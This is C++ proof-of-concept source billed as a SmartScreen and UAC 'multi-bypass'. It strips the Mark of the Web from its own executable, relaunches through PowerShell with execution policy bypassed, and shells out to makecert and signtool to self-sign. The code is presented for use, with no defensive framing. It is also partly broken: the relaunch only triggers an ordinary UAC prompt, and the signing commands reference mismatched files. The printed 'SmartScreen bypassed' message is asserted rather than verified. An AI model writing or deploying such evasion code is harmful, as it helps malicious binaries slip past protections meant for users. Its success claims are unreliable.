// SmartScreen + UAC Multi-Bypass PoC
// Includes Zone removal, launch tricks, and self-signing stub

#include <windows.h>
#include <shlobj.h>
#include <iostream>
#include <string>
#include <vector>

#pragma comment(linker, "/MANIFESTUAC:level='requireAdministrator' uiAccess='false'")

// ================== BYPASS 1: Remove Mark of the Web ==================
bool RemoveZoneIdentifier() {
    wchar_t szPath[MAX_PATH];
        GetModuleFileNameW(NULL, szPath, MAX_PATH);
            
                std::wstring stream = std::wstring(szPath) + L":Zone.Identifier";
                    
                        if (DeleteFileW(stream.c_str()) || GetLastError() == ERROR_FILE_NOT_FOUND) {
                                std::wcout << L"[+] Zone.Identifier removed.\n";
                                        return true;
                                            }
                                                return false;
                                                }

                                                // ================== BYPASS 2: Self-Signing Stub (requires tools present) ==================
                                                bool AttemptSelfSign() {
                                                    // This stub assumes signtool.exe and makecert are in PATH (Visual Studio / SDK)
                                                        // In practice, this is usually run from a build script, not runtime.
                                                            std::wcout << L"[*] Attempting self-signing (requires admin + tools)...\n";
                                                                
                                                                    system("makecert -r -pe -n \"CN=TempSigner\" -ss My -sr LocalMachine -a sha256 -len 2048 temp.cer > nul 2>&1");
                                                                        system("signtool sign /f temp.pfx /p password /fd SHA256 /t http://timestamp.digicert.com YourExe.exe > nul 2>&1");
                                                                            
                                                                                std::wcout << L"[*] Self-signing attempted. Check if certificate was created.\n";
                                                                                    return true;
                                                                                    }

                                                                                    // ================== BYPASS 3: Relaunch via PowerShell (clean context) ==================
                                                                                    bool RelaunchViaPowerShell() {
                                                                                        wchar_t szPath[MAX_PATH];
                                                                                            GetModuleFileNameW(NULL, szPath, MAX_PATH);
                                                                                                
                                                                                                    std::wstring cmd = L"powershell -ExecutionPolicy Bypass -Command \"Start-Process '";
                                                                                                        cmd += szPath;
                                                                                                            cmd += L"' -Verb RunAs\"";
                                                                                                                
                                                                                                                    STARTUPINFOW si = { sizeof(si) };
                                                                                                                        PROCESS_INFORMATION pi;
                                                                                                                            
                                                                                                                                if (CreateProcessW(NULL, &cmd[0], NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi)) {
                                                                                                                                        CloseHandle(pi.hProcess);
                                                                                                                                                CloseHandle(pi.hThread);
                                                                                                                                                        return true;
                                                                                                                                                            }
                                                                                                                                                                return false;
                                                                                                                                                                }

                                                                                                                                                                // ================== ELEVATION CHECK ==================
                                                                                                                                                                bool IsElevated() {
                                                                                                                                                                    HANDLE hToken = NULL;
                                                                                                                                                                        if (!OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken)) return false;
                                                                                                                                                                            
                                                                                                                                                                                TOKEN_ELEVATION elevation = { 0 };
                                                                                                                                                                                    DWORD dwSize = 0;
                                                                                                                                                                                        bool elevated = false;
                                                                                                                                                                                            
                                                                                                                                                                                                if (GetTokenInformation(hToken, TokenElevation, &elevation, sizeof(elevation), &dwSize)) {
                                                                                                                                                                                                        elevated = elevation.TokenIsElevated != 0;
                                                                                                                                                                                                            }
                                                                                                                                                                                                                CloseHandle(hToken);
                                                                                                                                                                                                                    return elevated;
                                                                                                                                                                                                                    }

                                                                                                                                                                                                                    // ================== MAIN ==================
                                                                                                                                                                                                                    int main() {
                                                                                                                                                                                                                        std::wcout << L"SmartScreen + UAC Multi-Bypass PoC\n\n";

                                                                                                                                                                                                                            if (!IsElevated()) {
                                                                                                                                                                                                                                    std::wcout << L"[!] Not elevated. Applying bypasses...\n";
                                                                                                                                                                                                                                            
                                                                                                                                                                                                                                                    RemoveZoneIdentifier();
                                                                                                                                                                                                                                                            RelaunchViaPowerShell();   // Try clean launch
                                                                                                                                                                                                                                                                    
                                                                                                                                                                                                                                                                            std::wcout << L"\nIf still blocked by SmartScreen:\n";
                                                                                                                                                                                                                                                                                    std::wcout << L"   1. Right-click exe → Properties → Unblock\n";
                                                                                                                                                                                                                                                                                            std::wcout << L"   2. Run again\n";
                                                                                                                                                                                                                                                                                                } else {
                                                                                                                                                                                                                                                                                                        std::wcout << L"[+] Success: Running with Administrator privileges.\n";
                                                                                                                                                                                                                                                                                                                std::wcout << L"SmartScreen bypassed.\n";
                                                                                                                                                                                                                                                                                                                        
                                                                                                                                                                                                                                                                                                                                // Optional: Attempt self-signing for future runs
                                                                                                                                                                                                                                                                                                                                        AttemptSelfSign();
                                                                                                                                                                                                                                                                                                                                            }

                                                                                                                                                                                                                                                                                                                                                return 0;
                                                                                                                                                                                                                                                                                                                                                }